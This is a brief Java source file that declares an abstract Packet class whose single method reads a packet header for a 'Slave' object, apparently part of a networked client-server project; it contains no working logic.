package com.redpois0n.packets;

import com.redpois0n.Slave;


public abstract class Packet {

	public abstract void read(Slave slave, String header) throws Exception;

}
